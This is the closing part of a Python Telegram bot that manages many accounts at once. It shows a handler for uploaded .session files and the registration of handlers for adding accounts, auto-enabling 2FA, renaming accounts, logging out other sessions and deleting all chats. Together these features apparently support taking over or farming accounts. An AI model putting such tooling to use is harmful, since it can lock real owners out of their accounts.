                chat_id=chat_id,
                text=final_text, parse_mode='Markdown'
            )


async def receive_session_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id
    
    if not update.message.document:
        await update.message.reply_text("That doesn't look like a file. Please send a `.session` file or /cancel.")
        return ADD_SESSION_FILE

    file_id = update.message.document.file_id
    file_name = update.message.document.file_name

    if not file_name.endswith('.session'):
        await update.message.reply_text("Invalid file type. Please send a `.session` file or /cancel.")
        return ADD_SESSION_FILE

    # Send initial "Processing your session file..." message
    initial_message = await safe_edit_or_reply(update, context, "Processing your session file, please wait...")
    
    if not initial_message:
        logger.error("Failed to send initial message for session file processing.")
        # If initial message fails, we should still try to process the file or inform the user
        await update.message.reply_text("Failed to send processing message, but I'll try to process your file. Please wait for a new message with the result.")
        chat_id = update.effective_chat.id
        message_id = None # No message_id to update, task will send a new one
    else:
        chat_id = initial_message.chat_id
        message_id = initial_message.message_id

    # Generate a unique temporary file name to avoid conflicts if multiple files are sent quickly
    session_file_path_temp = os.path.join(SESSIONS_DIR, f"{user_id}_temp_{os.urandom(4).hex()}_{file_name}")
    try:
        new_file = await context.bot.get_file(file_id)
        await new_file.download_to_drive(session_file_path_temp)
        logger.info(f"Downloaded session file to: {session_file_path_temp}")

        # Spawn a new task to process the session file in the background
        asyncio.create_task(
            _process_session_file_task(update, context, session_file_path_temp, chat_id, message_id)
        )

        return ADD_SESSION_FILE # Stay in ADD_SESSION_FILE state to allow more files
    except Exception as e:
        logger.error(f"Error downloading session file: {e}")
        await safe_edit_or_reply(update, context, f"An error occurred during file download: {e}. Please try again or /cancel.")
        if os.path.exists(session_file_path_temp):
            try:
                os.remove(session_file_path_temp)
            except OSError as e:
                logger.error(f"Error cleaning up temporary session file {session_file_path_temp}: {e}")
        return ADD_SESSION_FILE


# --- Main Application Setup ---

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()

    # Add Account Conversation
    add_account_conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex('^➕ Add New Account$'), add_account_start),
            MessageHandler(filters.Regex(r'^\+?\d{10,15}$'), direct_phone_number_entry)    
        ],
        states={
            PHONE: [
                MessageHandler(filters.Regex('^⚙️ Manage Accounts$'), lambda update, context: go_to_main_menu_option(update, context, manage_accounts)),
                MessageHandler(filters.Regex('^⚙️ Auto 2FA Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_2fa_settings_menu)),
                MessageHandler(filters.Regex('^📝 Auto Name Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_name_settings_menu)),
                MessageHandler(filters.Regex('^📊 My Accounts$'), lambda update, context: go_to_main_menu_option(update, context, my_accounts_summary)),
                MessageHandler(filters.Regex('^🗂️ Your Folders$'), lambda update, context: go_to_main_menu_option(update, context, my_folders_menu)),
                MessageHandler(filters.Regex('^➕ Add Session$'), lambda update, context: go_to_main_menu_option(update, context, add_session_file_start)), # New
                MessageHandler(filters.TEXT & ~filters.COMMAND, phone_number_handler)
            ],
            CODE: [
                MessageHandler(filters.Regex('^⚙️ Manage Accounts$'), lambda update, context: go_to_main_menu_option(update, context, manage_accounts)),
                MessageHandler(filters.Regex('^⚙️ Auto 2FA Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_2fa_settings_menu)),
                MessageHandler(filters.Regex('^📝 Auto Name Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_name_settings_menu)),
                MessageHandler(filters.Regex('^📊 My Accounts$'), lambda update, context: go_to_main_menu_option(update, context, my_accounts_summary)),
                MessageHandler(filters.Regex('^🗂️ Your Folders$'), lambda update, context: go_to_main_menu_option(update, context, my_folders_menu)),
                MessageHandler(filters.Regex('^➕ Add Session$'), lambda update, context: go_to_main_menu_option(update, context, add_session_file_start)), # New
                MessageHandler(filters.TEXT & ~filters.COMMAND, code_handler)
            ],
            PASSWORD: [
                MessageHandler(filters.Regex('^⚙️ Manage Accounts$'), lambda update, context: go_to_main_menu_option(update, context, manage_accounts)),
                MessageHandler(filters.Regex('^⚙️ Auto 2FA Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_2fa_settings_menu)),
                MessageHandler(filters.Regex('^📝 Auto Name Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_name_settings_menu)),
                MessageHandler(filters.Regex('^📊 My Accounts$'), lambda update, context: go_to_main_menu_option(update, context, my_accounts_summary)),
                MessageHandler(filters.Regex('^🗂️ Your Folders$'), lambda update, context: go_to_main_menu_option(update, context, my_folders_menu)),
                MessageHandler(filters.Regex('^➕ Add Session$'), lambda update, context: go_to_main_menu_option(update, context, add_session_file_start)), # New
                MessageHandler(filters.TEXT & ~filters.COMMAND, password_handler)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    # 2FA Enable Conversation
    tfa_enable_conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(tfa_enable_start, pattern='^tfa_enable_')],
        states={
            TFA_NEW_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, tfa_new_password_handler)],
            TFA_HINT: [MessageHandler(filters.TEXT & ~filters.COMMAND, tfa_hint_handler)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    # 2FA Disable Conversation
    tfa_disable_conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(tfa_disable_start, pattern='^tfa_disable_start_')],
        states={
            TFA_DISABLE_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, tfa_disable_password_handler)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    # Auto 2FA Settings Conversation
    auto_2fa_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^⚙️ Auto 2FA Settings$'), auto_2fa_settings_menu)],
        states={
            AUTO_2FA_MENU: [
                CallbackQueryHandler(auto_2fa_enable_start, pattern='^auto_2fa_enable_start$'),
                CallbackQueryHandler(auto_2fa_disable, pattern='^auto_2fa_disable$'),
                CallbackQueryHandler(auto_2fa_set_hint, pattern='^auto_2fa_set_hint$'),
                CallbackQueryHandler(start, pattern='^back_to_start$'),
            ],
            AUTO_2FA_SET_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, auto_2fa_password_input)],
            AUTO_2FA_SET_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, auto_2fa_count_input)],
            AUTO_2FA_SET_HINT: [MessageHandler(filters.TEXT & ~filters.COMMAND, auto_2fa_hint_input)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    # New Auto Name Conversation
    auto_name_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^📝 Auto Name Settings$'), auto_name_settings_menu)],
        states={
            AUTO_NAME_SET: [
                CallbackQueryHandler(auto_name_set_start, pattern='^auto_name_set_start$'),
                CallbackQueryHandler(auto_name_clear, pattern='^auto_name_clear$'),
                CallbackQueryHandler(start, pattern='^back_to_start$'),
                # Explicit MessageHandlers for other main menu buttons to exit this conversation
                MessageHandler(filters.Regex('^➕ Add New Account$'), lambda update, context: go_to_main_menu_option(update, context, add_account_start)),
                MessageHandler(filters.Regex('^⚙️ Manage Accounts$'), lambda update, context: go_to_main_menu_option(update, context, manage_accounts)),
                MessageHandler(filters.Regex('^⚙️ Auto 2FA Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_2fa_settings_menu)),
                MessageHandler(filters.Regex('^📊 My Accounts$'), lambda update, context: go_to_main_menu_option(update, context, my_accounts_summary)),
                MessageHandler(filters.Regex('^🗂️ Your Folders$'), lambda update, context: go_to_main_menu_option(update, context, my_folders_menu)),
                MessageHandler(filters.Regex('^📝 Auto Name Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_name_settings_menu)),
                MessageHandler(filters.Regex('^➕ Add Session$'), lambda update, context: go_to_main_menu_option(update, context, add_session_file_start)), # New
                # Generic text handler should be last
                MessageHandler(filters.TEXT & ~filters.COMMAND, auto_name_input)
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        conversation_timeout=120
    )

    # Folder Management Conversation
    folder_management_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🗂️ Your Folders$'), my_folders_menu)],
        states={
            FOLDER_MENU: [
                CallbackQueryHandler(create_new_folder_start, pattern='^create_new_folder$'),
                CallbackQueryHandler(select_folder_callback, pattern='^select_folder_'),
                CallbackQueryHandler(start, pattern='^back_to_start$'),
            ],
            CREATE_FOLDER_NAME: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, create_folder_name_handler),
                # Explicit MessageHandlers for other main menu buttons to exit this conversation
                MessageHandler(filters.Regex('^➕ Add New Account$'), lambda update, context: go_to_main_menu_option(update, context, add_account_start)),
                MessageHandler(filters.Regex('^⚙️ Manage Accounts$'), lambda update, context: go_to_main_menu_option(update, context, manage_accounts)),
                MessageHandler(filters.Regex('^⚙️ Auto 2FA Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_2fa_settings_menu)),
                MessageHandler(filters.Regex('^📝 Auto Name Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_name_settings_menu)),
                MessageHandler(filters.Regex('^📊 My Accounts$'), lambda update, context: go_to_main_menu_option(update, context, my_accounts_summary)),
                MessageHandler(filters.Regex('^🗂️ Your Folders$'), lambda update, context: go_to_main_menu_option(update, context, my_folders_menu)),
                MessageHandler(filters.Regex('^➕ Add Session$'), lambda update, context: go_to_main_menu_option(update, context, add_session_file_start)), # New
            ],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        conversation_timeout=120
    )

    # Add Session Conversation
    add_session_conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^➕ Add Session$'), add_session_file_start)],
        states={
            ADD_SESSION_FILE: [
                MessageHandler(filters.Document.ALL, receive_session_file),
                # Allow other main menu buttons to exit this conversation
                MessageHandler(filters.Regex('^➕ Add New Account$'), lambda update, context: go_to_main_menu_option(update, context, add_account_start)),
                MessageHandler(filters.Regex('^⚙️ Manage Accounts$'), lambda update, context: go_to_main_menu_option(update, context, manage_accounts)),
                MessageHandler(filters.Regex('^⚙️ Auto 2FA Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_2fa_settings_menu)),
                MessageHandler(filters.Regex('^📝 Auto Name Settings$'), lambda update, context: go_to_main_menu_option(update, context, auto_name_settings_menu)),
                MessageHandler(filters.Regex('^📊 My Accounts$'), lambda update, context: go_to_main_menu_option(update, context, my_accounts_summary)),
                MessageHandler(filters.Regex('^🗂️ Your Folders$'), lambda update, context: go_to_main_menu_option(update, context, my_folders_menu)),
            ],
            # SELECT_FOLDER_FOR_SESSION state removed as per request
        },
        fallbacks=[CommandHandler('cancel', cancel)],
        conversation_timeout=300 # Increased timeout for file upload
    )


    # --- Register Handlers ---
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    
    # Add all Conversation Handlers (order matters for overlapping handlers)
    application.add_handler(add_account_conv)
    application.add_handler(tfa_enable_conv_handler)
    application.add_handler(tfa_disable_conv_handler)
    application.add_handler(auto_2fa_conv_handler)
    application.add_handler(auto_name_conv_handler)
    application.add_handler(folder_management_conv_handler) # New folder handler
    application.add_handler(add_session_conv_handler) # New add session handler
    
    # Regular Handlers (for buttons not part of a specific conversation, or entry points)
    application.add_handler(CommandHandler("manage", manage_accounts))
    application.add_handler(MessageHandler(filters.Regex('^⚙️ Manage Accounts$'), manage_accounts))
    application.add_handler(MessageHandler(filters.Regex('^➕ Add New Account$'), add_account_start))
    application.add_handler(MessageHandler(filters.Regex('^⚙️ Auto 2FA Settings$'), auto_2fa_settings_menu))
    application.add_handler(MessageHandler(filters.Regex('^📝 Auto Name Settings$'), auto_name_settings_menu))
    application.add_handler(MessageHandler(filters.Regex('^📊 My Accounts$'), my_accounts_summary)) # New My Accounts handler
    application.add_handler(MessageHandler(filters.Regex('^🗂️ Your Folders$'), my_folders_menu)) # New Your Folders handler
    application.add_handler(MessageHandler(filters.Regex('^➕ Add Session$'), add_session_file_start)) # New Add Session handler

    # Callback Query Handlers
    # IMPORTANT: Place more specific patterns BEFORE less specific ones IF they overlap
    application.add_handler(CallbackQueryHandler(confirm_delete_all_chats_callback, pattern='^confirm_delete_all_chats_'))
    application.add_handler(CallbackQueryHandler(delete_all_chat_history_callback, pattern='^delete_all_chats_confirmed_'))
    
    application.add_handler(CallbackQueryHandler(confirm_delete_callback, pattern='^confirm_delete_'))
    application.add_handler(CallbackQueryHandler(delete_callback, pattern='^delete_'))
    
    application.add_handler(CallbackQueryHandler(manage_account_callback, pattern='^manage_'))
    application.add_handler(CallbackQueryHandler(manage_accounts, pattern='^back_to_manage_list$'))    # This will now reset page to 0
    application.add_handler(CallbackQueryHandler(start, pattern='^back_to_start$'))
    
    application.add_handler(CallbackQueryHandler(stats_callback, pattern='^stats_'))    
    
    application.add_handler(CallbackQueryHandler(active_sessions_callback, pattern='^sessions_'))
    application.add_handler(CallbackQueryHandler(terminate_session_callback, pattern='^terminate_'))
    application.add_handler(CallbackQueryHandler(logout_all_others_callback, pattern='^logout_all_others_'))    
    
    application.add_handler(CallbackQueryHandler(tfa_menu_callback, pattern='^tfa_menu_'))
    
    # New handlers for previous/next account navigation
    application.add_handler(CallbackQueryHandler(previous_account_callback, pattern='^prev_account_'))
    application.add_handler(CallbackQueryHandler(next_account_callback, pattern='^next_account_'))

    # Auto Name Callbacks
    application.add_handler(CallbackQueryHandler(auto_name_set_start, pattern='^auto_name_set_start$'))
    application.add_handler(CallbackQueryHandler(auto_name_clear, pattern='^auto_name_clear$'))

    # Folder Callbacks
    application.add_handler(CallbackQueryHandler(create_new_folder_start, pattern='^create_new_folder$'))
    application.add_handler(CallbackQueryHandler(select_folder_callback, pattern='^select_folder_'))


    logger.info("Bot is starting...")
    application.run_polling()

if __name__ == '__main__':
    main()
